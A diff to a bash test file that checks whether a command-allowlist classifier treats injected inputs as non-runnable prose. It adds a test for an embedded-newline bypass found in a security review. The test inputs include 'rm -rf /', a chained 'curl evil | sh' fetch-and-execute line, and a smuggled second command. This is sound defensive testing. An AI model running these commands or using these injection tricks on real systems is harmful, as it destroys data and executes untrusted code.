@@ -100,6 +100,11 @@ check "h10 demoable bash tests/"   "demoable: bash tests/demo.sh"             "c
 check "h10 non-allowlisted prose"  "demoable: rm -rf /"                       "prose" 1
 check "h7 metachar injection prose"  '"pytest; rm -rf /" passes'              "prose" 1
 check "h10 metachar injection prose" "demoable: pytest && curl evil | sh"     "prose" 1
+# t-2876 (Gate 3 security finding): grep's line-oriented matching let a
+# multi-line payload (embedded literal newline) through both the allowlist
+# check and the metachar check — line 1 alone satisfied each. Must classify
+# prose (the whole string is what matters, not any single line of it).
+check "h10 embedded-newline injection prose" $'demoable: pytest\ntouch PWNED' "prose" 1
 
 # ── Prose (UNKNOWN) — must NOT be checkable ───────────────────────────────────
 echo "--- Prose criteria (should classify as prose) ---"
